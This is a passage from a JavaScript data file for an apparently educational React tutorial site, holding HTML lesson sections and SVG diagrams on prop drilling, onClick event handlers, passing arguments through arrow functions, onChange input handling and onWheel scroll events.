                      <rect x="15" y="48" width="200" height="26" rx="4" fill="var(--bg-canvas)" stroke="var(--border)"/>
                      <text x="115" y="65" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success);">shrink-0 (Fixed Width)</text>
                      <text x="115" y="94" text-anchor="middle" class="svg-sub">Full width preserved ✓</text>
                    </g>

                    <!-- Card 2 -->
                    <g transform="translate(270, 50)">
                      <rect x="0" y="0" width="230" height="110" rx="8" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.5"/>
                      <text x="115" y="32" text-anchor="middle" class="svg-title">Card 2: Underserved</text>
                      <rect x="15" y="48" width="200" height="26" rx="4" fill="var(--bg-canvas)" stroke="var(--border)"/>
                      <text x="115" y="65" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success);">shrink-0 (Fixed Width)</text>
                      <text x="115" y="94" text-anchor="middle" class="svg-sub">Full width preserved ✓</text>
                    </g>

                    <!-- Card 3 -->
                    <g transform="translate(520, 50)">
                      <rect x="0" y="0" width="230" height="110" rx="8" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.5"/>
                      <text x="115" y="32" text-anchor="middle" class="svg-title">Card 3: Underbanked</text>
                      <rect x="15" y="48" width="200" height="26" rx="4" fill="var(--bg-canvas)" stroke="var(--border)"/>
                      <text x="115" y="65" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success);">shrink-0 (Fixed Width)</text>
                      <text x="115" y="94" text-anchor="middle" class="svg-sub">Full width preserved ✓</text>
                    </g>

                    <!-- Peek Arrow -->
                    <text x="795" y="110" text-anchor="middle" class="svg-title" style="fill:var(--accent);">➔</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "21.2",
          title: "Passing Props Down Multiple Component Levels (Prop Drilling)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>The Prop Forwarding Pipeline:</strong>
                <ul class="notes-sub-list">
                  <li>In real projects, data often lives at the application root (<code>App.jsx</code>) and must travel down multiple component layers:
                    <ul class="notes-sub-list">
                      <li><strong>Level 1 (<code>App</code>):</strong> Holds <code>users</code> array → passes to <code>&lt;Section1 users={users} /&gt;</code>.</li>
                      <li><strong>Level 2 (<code>Section1</code>):</strong> Forwards <code>props.users</code> → <code>&lt;Page1Content users={props.users} /&gt;</code>.</li>
                      <li><strong>Level 3 (<code>Page1Content</code>):</strong> Forwards <code>props.users</code> → <code>&lt;RightContent users={props.users} /&gt;</code>.</li>
                      <li><strong>Level 4 (<code>RightContent</code>):</strong> Maps over array → passes individual fields to <code>&lt;RightCard color={elem.color} ... /&gt;</code>.</li>
                      <li><strong>Level 5 (<code>RightCard</code>):</strong> Forwards props to <code>&lt;RightCardContent color={props.color} /&gt;</code>.</li>
                    </ul>
                  </li>
                  <li><strong>The Architectural Friction:</strong> Passing props through intermediary components that do not need the data themselves is known as <strong>Prop Drilling</strong>—this pattern motivates the use of the React Context API in advanced applications.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 21.2 · Multi-Tier Prop Drilling Pipeline Across Component Generations</span>
                <span class="diagram-frame-tag">UNIDIRECTIONAL PROP CHAIN</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 210" class="arch-svg" role="img" aria-label="Diagram illustrating prop drilling from App down through Section1, Page1Content, RightContent to RightCard">
                  <!-- Flow from left to right -->
                  <!-- Step 1 -->
                  <g transform="translate(25, 25)">
                    <rect x="0" y="0" width="140" height="150" rx="8" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="70" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">TIER 1</text>
                    <text x="70" y="52" text-anchor="middle" class="svg-title">App.jsx</text>
                    <rect x="10" y="66" width="120" height="70" rx="4" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="70" y="98" text-anchor="middle" class="svg-mono-xs">users data</text>
                    <text x="70" y="118" text-anchor="middle" class="svg-sub">Origin Source</text>
                  </g>

                  <line x1="170" y1="100" x2="195" y2="100" stroke="var(--primary)" stroke-width="2"/>
                  <polygon points="195,96 203,100 195,104" fill="var(--primary)"/>

                  <!-- Step 2 -->
                  <g transform="translate(208, 25)">
                    <rect x="0" y="0" width="140" height="150" rx="8" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.5"/>
                    <text x="70" y="28" text-anchor="middle" class="svg-kicker">TIER 2</text>
                    <text x="70" y="52" text-anchor="middle" class="svg-title">Section1</text>
                    <rect x="10" y="66" width="120" height="70" rx="4" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="70" y="98" text-anchor="middle" class="svg-mono-xs">props.users</text>
                    <text x="70" y="118" text-anchor="middle" class="svg-sub">Intermediary</text>
                  </g>

                  <line x1="353" y1="100" x2="378" y2="100" stroke="var(--border)" stroke-width="2"/>
                  <polygon points="378,96 386,100 378,104" fill="var(--border)"/>

                  <!-- Step 3 -->
                  <g transform="translate(391, 25)">
                    <rect x="0" y="0" width="140" height="150" rx="8" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.5"/>
                    <text x="70" y="28" text-anchor="middle" class="svg-kicker">TIER 3</text>
                    <text x="70" y="52" text-anchor="middle" class="svg-title">Page1Content</text>
                    <rect x="10" y="66" width="120" height="70" rx="4" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="70" y="98" text-anchor="middle" class="svg-mono-xs">props.users</text>
                    <text x="70" y="118" text-anchor="middle" class="svg-sub">Pass-through</text>
                  </g>

                  <line x1="536" y1="100" x2="561" y2="100" stroke="var(--accent)" stroke-width="2"/>
                  <polygon points="561,96 569,100 561,104" fill="var(--accent)"/>

                  <!-- Step 4 -->
                  <g transform="translate(574, 25)">
                    <rect x="0" y="0" width="140" height="150" rx="8" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.6"/>
                    <text x="70" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">TIER 4</text>
                    <text x="70" y="52" text-anchor="middle" class="svg-title">RightContent</text>
                    <rect x="10" y="66" width="120" height="70" rx="4" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="70" y="98" text-anchor="middle" class="svg-mono-xs">.map(elem)</text>
                    <text x="70" y="118" text-anchor="middle" class="svg-sub">Extracts Fields</text>
                  </g>

                  <line x1="719" y1="100" x2="744" y2="100" stroke="var(--success)" stroke-width="2"/>
                  <polygon points="744,96 752,100 744,104" fill="var(--success)"/>

                  <!-- Step 5 -->
                  <g transform="translate(757, 25)">
                    <rect x="0" y="0" width="100" height="150" rx="8" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="50" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">LEAF</text>
                    <text x="50" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">Card</text>
                    <rect x="8" y="66" width="84" height="70" rx="4" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="50" y="98" text-anchor="middle" class="svg-mono-xs">UI Node</text>
                    <text x="50" y="118" text-anchor="middle" class="svg-sub">Renders</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "21.3",
          title: "Dynamic Inline Styles & Debugging undefined Props",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Dynamic Color Binding with the <code>style</code> Attribute:</strong>
                <ul class="notes-sub-list">
                  <li>When CSS values (like custom brand hex codes or theme colors) arrive dynamically via props, apply them using React's inline style object:
                    <pre class="notes-code-block"><code>&lt;button style={{ backgroundColor: props.color }} className="px-4 py-2 rounded-full text-white"&gt;
  Learn More
&lt;/button&gt;</code></pre>
                  </li>
                </ul>
              </li>
              <li><strong>How to Debug <code>undefined</code> Props:</strong>
                <ul class="notes-sub-list">
                  <li>If a deeply nested child receives <code>undefined</code>, do not panic. Place a <code>console.log(props.color)</code> at each level of the hierarchy:
                    <ul class="notes-sub-list">
                      <li><code>RightCardContent</code> (shows undefined) → check <code>RightCard</code></li>
                      <li><code>RightCard</code> (shows undefined) → check <code>RightContent</code></li>
                      <li><code>RightContent</code> (shows undefined) → check <code>Page1Content</code></li>
                    </ul>
                  </li>
                  <li>The exact link where the log changes from defined to <code>undefined</code> reveals the missing prop assignment!</li>
                </ul>
              </li>
            </ul>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 22: HANDLING EVENTS & CALLING FUNCTIONS IN REACT
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-22-handling-events-functions",
      number: "22",
      shortLabel: "Event Handling & Functions",
      title: "Handling Events & Calling Functions in React",
      summary: "Vanilla JS addEventListener vs. React synthetic event props, function reference vs. immediate function execution, and passing arguments via wrapper arrow functions.",
      subtopicLabels: ["22.1 Vanilla vs React Events", "22.2 Reference vs Call", "22.3 Passing Arguments"],
      diagramCount: 2,
      sections: [
        {
          num: "22.1",
          title: "Vanilla JS addEventListener vs. React Event Props (onClick)",
          content: `
            <p>
              In modern web development, capturing user interaction (button clicks, form submits, key presses) is fundamental. However, the architectural difference between Vanilla JavaScript and React is profound:
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Imperative Vanilla JS Workflow & Its Flaws:</strong>
                <ul class="notes-sub-list">
                  <li>In Vanilla JavaScript, attaching an event listener requires finding the DOM element with <code>document.querySelector('button')</code> or <code>document.getElementById()</code>, then imperatively calling <code>btn.addEventListener('click', handler)</code>.</li>
                  <li><strong>Memory Leak Hazard:</strong> If elements are dynamically created and destroyed without manually running <code>removeEventListener</code>, detached DOM elements stay pinned in browser RAM, causing catastrophic memory leaks.</li>
                  <li><strong>Scattered Code:</strong> Markup lives in HTML, while event listeners live in separate JS files, forcing developers to mentally jump across files to trace UI behavior.</li>
                </ul>
              </li>
              <li><strong>The Declarative React Way (Co-Located Synthetic Events):</strong>
                <ul class="notes-sub-list">
                  <li>In React, event listeners are passed directly as camelCase JSX props (<code>onClick</code>, <code>onChange</code>, <code>onSubmit</code>). You never write <code>document.querySelector</code>.</li>
                  <li><strong>Root Event Delegation:</strong> React does not attach real DOM listeners to every single button. Instead, starting in React 17/18, React attaches a single top-level delegator listener to the root DOM container (<code>&lt;div id="root"&gt;</code>). When a click bubbles up, React's event system maps the event to the correct component Fiber node in memory and dispatches a cross-browser normalized <strong>SyntheticEvent</strong> wrapper!</li>
                  <li><strong>Automatic Memory Cleanup:</strong> When a React component unmounts, React cleans up the component's internal listener references automatically—zero memory leaks.</li>
                </ul>
              </li>
            </ul>

            <pre class="notes-code-block"><code>import React from 'react';

function App() {
  // Event handler defined directly inside component scope
  const handleButtonClick = () => {
    console.log('Button clicked! SyntheticEvent dispatched by React.');
  };

  return (
    &lt;div className="p-6"&gt;
      {/* Declarative: listener is co-located with the UI element */}
      &lt;button 
        onClick={handleButtonClick}
        className="px-4 py-2 bg-emerald-600 text-white rounded font-medium hover:bg-emerald-700 transition"
      &gt;
        Click Me
      &lt;/button&gt;
    &lt;/div&gt;
  );
}

export default App;</code></pre>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 22.1 · Event Delegation: Imperative DOM Listeners vs. React Synthetic Events</span>
                <span class="diagram-frame-tag">EVENT DISPATCHING ARCHITECTURE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram contrasting manual addEventListener on individual DOM nodes with React declarative onClick synthetic event">
                  <!-- Vanilla JS -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.5"/>
                    <text x="200" y="28" text-anchor="middle" class="svg-kicker">IMPERATIVE JAVASCRIPT</text>
                    <text x="200" y="52" text-anchor="middle" class="svg-title">document.addEventListener()</text>

                    <rect x="15" y="66" width="365" height="95" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="88" class="svg-mono-xs">const btn = document.querySelector('button');</text>
                    <text x="25" y="108" class="svg-mono-xs">btn.addEventListener('click', handleClick);</text>
                    <text x="25" y="130" class="svg-mono-xs" style="fill:var(--danger);">• Direct node attachment</text>
                    <text x="25" y="148" class="svg-mono-xs" style="fill:var(--text-muted);">• Manual cleanup needed on unmount</text>
                  </g>

                  <!-- React JSX -->
                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="200" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">DECLARATIVE REACT ✓</text>
                    <text x="200" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">SyntheticEvent Props (onClick)</text>

                    <rect x="15" y="66" width="365" height="95" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="88" class="svg-mono-xs">&lt;button onClick={handleClick}&gt;Click&lt;/button&gt;</text>
                    <text x="25" y="110" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">• Declarative & co-located in JSX</text>
                    <text x="25" y="130" class="svg-mono-xs" style="fill:var(--primary);">• Root event delegation (Fast)</text>
                    <text x="25" y="148" class="svg-mono-xs" style="fill:var(--success);">• Automatic memory garbage collection</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "22.2",
          title: "Function Reference vs. Function Call (Critical Rule)",
          content: `
            <p>
              One of the most frequent junior bugs in React is accidentally invoking a function during component render instead of passing its reference to the event prop.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Golden Rule: Pass the Reference, Do Not Call:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Correct — Passing the Function Reference:</strong>
                    <br><code>&lt;button onClick={btnClicked}&gt;</code>
                    <br>Notice there are <strong>NO parentheses</strong>. You are telling React: <em>"Here is the function's address in memory. Store it, and execute it only when the user physically clicks this button."</em>
                  </li>
                  <li><strong>Fatal Mistake — Immediate Function Invocation:</strong>
                    <br><code>&lt;button onClick={btnClicked()}&gt;</code>
                    <br>The addition of <code>()</code> tells JavaScript to execute <code>btnClicked()</code> immediately when evaluating the JSX during the component's render phase—before the user has ever touched the screen!
                  </li>
                  <li><strong>The Infinite Render Loop Trap:</strong> If <code>btnClicked()</code> updates component state (via <code>setState</code>), calling it immediately triggers a re-render. During that re-render, JSX evaluates <code>btnClicked()</code> again, triggering another re-render, spiraling into: <code>Uncaught Error: Too many re-renders. React limits the number of renders to prevent an infinite loop.</code></li>
                </ul>
              </li>
            </ul>

            <pre class="notes-code-block"><code>function BadComponent() {
  const [count, setCount] = React.useState(0);

  // ❌ FATAL BUG: count gets updated immediately on render!
  // Triggers infinite re-render loop!
  return &lt;button onClick={setCount(count + 1)}&gt;Count: {count}&lt;/button&gt;;
}

function GoodComponent() {
  const [count, setCount] = React.useState(0);

  // ✓ CORRECT: Callback passed as a reference
  const increment = () => setCount(prev => prev + 1);

  return &lt;button onClick={increment}&gt;Count: {count}&lt;/button&gt;;
}</code></pre>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 22.2 · Execution Timing: Function Reference vs. Immediate Execution</span>
                <span class="diagram-frame-tag">EXECUTION TIMING GUARDRAIL</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram contrasting incorrect immediate execution onClick={fn()} with correct reference passing onClick={fn}">
                  <!-- Bad: Immediate Call -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="137" height="20" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
                    <text x="83.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">FATAL MISTAKE ❌</text>
                    <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--danger);">onClick={btnClicked()}</text>

                    <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="25" y="94" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">Executes immediately on initial render!</text>
                    <text x="25" y="114" class="svg-mono-xs" style="fill:var(--text-muted);">Runs before user ever clicks</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--danger);">Leaves onClick bound to undefined</text>
                  </g>

                  <!-- Good: Function Reference -->
                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="152" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="91" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">CORRECT PATTERN ✓</text>
                    <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--success);">onClick={btnClicked}</text>

                    <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="94" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Passes function reference (idle)</text>
                    <text x="25" y="114" class="svg-mono-xs" style="fill:var(--text);">Waits completely idle until click occurs</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--success);">Runs on-demand when clicked ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "22.3",
          title: "Passing Arguments to Event Handlers via Arrow Functions",
          content: `
            <p>
              In real-world applications, you rarely call a function without arguments. For example, in a list of users or products, clicking "Delete" requires passing the specific item's <code>id</code>.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Problem:</strong> How do you pass <code>id</code> without writing <code>onClick={deleteItem(id)}</code>, which would execute immediately?</li>
              <li><strong>The Solution — Anonymous Arrow Function Wrapper:</strong>
                <ul class="notes-sub-list">
                  <li>Wrap the function call inside an anonymous arrow function:
                    <br><code>onClick={() =&gt; deleteItem(id)}</code>
                  </li>
                  <li>Here, the outer arrow function <code>() =&gt; ...</code> is a function <strong>reference</strong>. It is not called during render. When the user clicks the button, React invokes the arrow function, which in turn calls <code>deleteItem(id)</code> with the desired argument!</li>
                </ul>
              </li>
              <li><strong>Accessing the Event Object with Arguments:</strong>
                <ul class="notes-sub-list">
                  <li>If you need both the native SyntheticEvent and custom arguments, forward <code>e</code> through the arrow function:
                    <br><code>onClick={(e) =&gt; handleEdit(e, user.id)}</code>
                  </li>
                </ul>
              </li>
            </ul>

            <pre class="notes-code-block"><code>import React from 'react';

function UserList() {
  const users = [
    { id: 101, name: 'Sarthak' },
    { id: 102, name: 'Aman' },
    { id: 103, name: 'Harsh' }
  ];

  const handleDelete = (id, e) => {
    e.stopPropagation(); // Stop event bubbling
    console.log('Deleting user ID:', id);
  };

  return (
    &lt;ul className="space-y-2"&gt;
      {users.map(user => (
        &lt;li key={user.id} className="flex justify-between items-center p-3 border rounded"&gt;
          &lt;span&gt;{user.name}&lt;/span&gt;
          {/* Arrow function wrapper passes id without immediate execution */}
          &lt;button 
            onClick={(e) => handleDelete(user.id, e)}
            className="text-red-500 hover:text-red-700 text-sm font-semibold"
          &gt;
            Delete
          &lt;/button&gt;
        &lt;/li&gt;
      ))}
    &lt;/ul&gt;
  );
}

export default UserList;</code></pre>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 23
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-23-input-and-scroll-events",
      number: "23",
      shortLabel: "Input & Wheel Events",
      title: "Working With Input Events (onChange) & Scroll Wheel Events (onWheel)",
      summary: "Extracting user keystrokes with e.target.value in onChange, tracking trackpad/mouse wheel gestures with onWheel and deltaY polarity, and event normalization across browsers.",
      subtopicLabels: ["23.1 onChange & target.value", "23.2 onWheel & deltaY", "23.3 SyntheticEvent"],
      diagramCount: 2,
      sections: [
        {
          num: "23.1",
          title: "Working With Input Events (onChange) & e.target.value",
          content: `
            <p>
              When a user interacts with text boxes (<code>&lt;input&gt;</code>, <code>&lt;textarea&gt;</code>), React intercepts every keystroke via the <code>onChange</code> prop.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Input Event Lifecycle:</strong>
                <ul class="notes-sub-list">
                  <li>In native HTML, <code>onchange</code> fires only when the input <strong>loses focus</strong> (blur). React deliberately normalizes this so that <code>onChange</code> fires <strong>on every single keystroke</strong> (identical to the native <code>oninput</code> event).</li>
                  <li>Whenever the user types a character, React creates a SyntheticEvent and passes it to your handler.</li>
                </ul>
              </li>
              <li><strong>Extracting the Live Value via <code>e.target.value</code>:</strong>
                <ul class="notes-sub-list">
                  <li><code>e</code>: The React <strong>SyntheticEvent</strong> object.</li>
                  <li><code>e.target</code>: The underlying physical DOM node (the <code>&lt;input&gt;</code> element).</li>
                  <li><code>e.target.value</code>: The exact string currently present inside the text field.</li>
                </ul>
              </li>
            </ul>

            <pre class="notes-code-block"><code>import React, { useState } from 'react';

function SearchBar() {
  const [query, setQuery] = useState('');

  const handleInputChange = (e) => {
    // e.target.value contains the live string typed by the user
    console.log('User typed:', e.target.value);
    setQuery(e.target.value);
  };

  return (
    &lt;div className="p-4"&gt;
      &lt;input 
        type="text" 
        placeholder="Search topics..."
        value={query}
        onChange={handleInputChange}
        className="w-full px-4 py-2 border rounded shadow-sm focus:outline-none focus:ring-2 focus:ring-emerald-500"
      /&gt;
      &lt;p className="mt-2 text-sm text-gray-500"&gt;Live Query: {query}&lt;/p&gt;
    &lt;/div&gt;
  );
}

export default SearchBar;</code></pre>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 23.1 · Live Input Stream: Keystroke to SyntheticEvent Pipeline</span>
                <span class="diagram-frame-tag">REAL-TIME INPUT DISPATCH</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 210" class="arch-svg" role="img" aria-label="Diagram showing user keystrokes firing onChange and extracting e.target.value into handler">
                  <!-- Step 1: User Types -->
                  <g transform="translate(30, 25)">
                    <rect x="0" y="0" width="220" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="110" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">1 · USER KEYSTROKE</text>
                    <text x="110" y="52" text-anchor="middle" class="svg-title">Keyboard Input</text>
                    <rect x="15" y="66" width="190" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="110" y="95" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text); font-weight:700;">Types: "sarthak"</text>
                    <text x="110" y="115" text-anchor="middle" class="svg-sub">Triggers raw DOM input</text>
                  </g>

                  <!-- Arrow 1 -> 2 -->
                  <g transform="translate(260, 90)">
                    <line x1="0" y1="10" x2="35" y2="10" stroke="var(--primary)" stroke-width="2"/>
                    <polygon points="35,6 43,10 35,14" fill="var(--primary)"/>
                    <text x="20" y="2" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--primary);">onChange</text>
                  </g>

                  <!-- Step 2: SyntheticEvent -->
                  <g transform="translate(315, 25)">
                    <rect x="0" y="0" width="250" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.8"/>
                    <text x="125" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">2 · REACT SYNTHETIC EVENT</text>
                    <text x="125" y="52" text-anchor="middle" class="svg-title">Event Object Interception</text>
                    <rect x="15" y="66" width="220" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="125" y="94" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">e.target.value</text>
                    <text x="125" y="114" text-anchor="middle" class="svg-sub">Extracts live string value</text>
                  </g>

                  <!-- Arrow 2 -> 3 -->
                  <g transform="translate(575, 90)">
                    <line x1="0" y1="10" x2="35" y2="10" stroke="var(--success)" stroke-width="2"/>
                    <polygon points="35,6 43,10 35,14" fill="var(--success)"/>
                    <text x="20" y="2" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--success);">Passes val</text>
                  </g>

                  <!-- Step 3: Function Handler -->
                  <g transform="translate(620, 25)">
                    <rect x="0" y="0" width="230" height="150" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="115" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">3 · HANDLER EXECUTION</text>
                    <text x="115" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">inputChanging(val)</text>
                    <rect x="15" y="66" width="200" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="115" y="95" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">console.log(val)</text>
                    <text x="115" y="115" text-anchor="middle" class="svg-sub">Logs each keystroke ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "23.2",
          title: "Capturing Scroll Wheel Events (onWheel) & deltaY",
          content: `
            <p>
              Beyond keyboard and click events, modern web applications often build bespoke scroll experiences (such as horizontal card carousels, zoomable canvases, or 3D interactive viewers) using the <code>onWheel</code> event.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>What is <code>onWheel</code>?</strong>
                <ul class="notes-sub-list">
                  <li><code>onWheel</code> fires continuously as the user rotates a mouse scroll wheel or swipes two fingers vertically on a laptop trackpad.</li>
                  <li>Unlike <code>onScroll</code> (which only fires when a scrollable container's scrollbar moves), <code>onWheel</code> detects user intent even on unscrollable elements.</li>
                </ul>
              </li>
              <li><strong>Understanding <code>e.deltaY</code> Polarity:</strong>
                <ul class="notes-sub-list">
                  <li><code>e.deltaY &gt; 0</code>: User scrolled <strong>DOWN</strong> (pulling content upward).</li>
                  <li><code>e.deltaY &lt; 0</code>: User scrolled <strong>UP</strong> (pushing content downward).</li>
                  <li><strong>Converting Vertical Wheel to Horizontal Scroll:</strong> By attaching <code>onWheel</code> to a horizontally scrollable container, you can translate <code>e.deltaY</code> directly into container <code>scrollLeft += e.deltaY</code>, allowing users to scroll horizontal carousels smoothly with a standard mouse!</li>
                </ul>
              </li>
            </ul>

            <pre class="notes-code-block"><code>import React, { useRef } from 'react';

function HorizontalCarousel({ items }) {
  const containerRef = useRef(null);

  const handleWheel = (e) => {
    // Convert vertical wheel rotation into horizontal container scroll
    if (containerRef.current) {
      containerRef.current.scrollLeft += e.deltaY;
    }
  };

  return (
    &lt;div 
      ref={containerRef}
      onWheel={handleWheel}
      className="flex gap-4 overflow-x-auto p-4 scroll-smooth"
    &gt;
      {items.map((item, idx) => (
        &lt;div key={idx} className="min-w-[280px] h-40 bg-card rounded-lg p-4 shadow border"&gt;
          &lt;h4 className="font-bold"&gt;{item.title}&lt;/h4&gt;
        &lt;/div&gt;
      ))}
    &lt;/div&gt;
  );
}

export default HorizontalCarousel;</code></pre>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 23.2 · Mouse Wheel Vector Analysis: onWheel & deltaY Polarity</span>
                <span class="diagram-frame-tag">WHEEL GESTURE TELEMETRY</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram showing onWheel deltaY polarity: deltaY greater than 0 means downward scrolling, deltaY less than 0 means upward scrolling">
                  <!-- Downward Scroll -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="160" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="95" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">SCROLL DOWNWARD</text>
                    <text x="200" y="56" text-anchor="middle" class="svg-title">deltaY &gt; 0 (Positive Value)</text>

                    <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--primary)"/>
                    <text x="25" y="94" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">Direction: Forward / Down</text>
                    <text x="25" y="114" class="svg-mono-xs">Example values: +15, +50, +120</text>
                    <text x="25" y="134" class="svg-sub">Reveal next section, shrink navbar</text>
                  </g>

                  <!-- Upward Scroll -->
                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="160" height="20" rx="4" fill="var(--accent-light)" stroke="var(--accent)" stroke-width="1.2"/>
                    <text x="95" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">SCROLL UPWARD</text>
                    <text x="200" y="56" text-anchor="middle" class="svg-title">deltaY &lt; 0 (Negative Value)</text>

                    <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="25" y="94" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">Direction: Backward / Up</text>
                    <text x="25" y="114" class="svg-mono-xs">Example values: -15, -50, -120</text>
                    <text x="25" y="134" class="svg-sub">Reveal floating header, back to top</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "23.3",
          title: "SyntheticEvent Normalization Across Browsers",
          content: `
            <p>
              In raw JavaScript, different browsers historically exposed different properties on event objects (e.g., <code>wheelDelta</code> in older WebKit vs <code>detail</code> in Firefox).
            </p>

            <ul class="notes-bullet-list">
              <li><strong>React's SyntheticEvent Wrapper:</strong>
                <ul class="notes-sub-list">
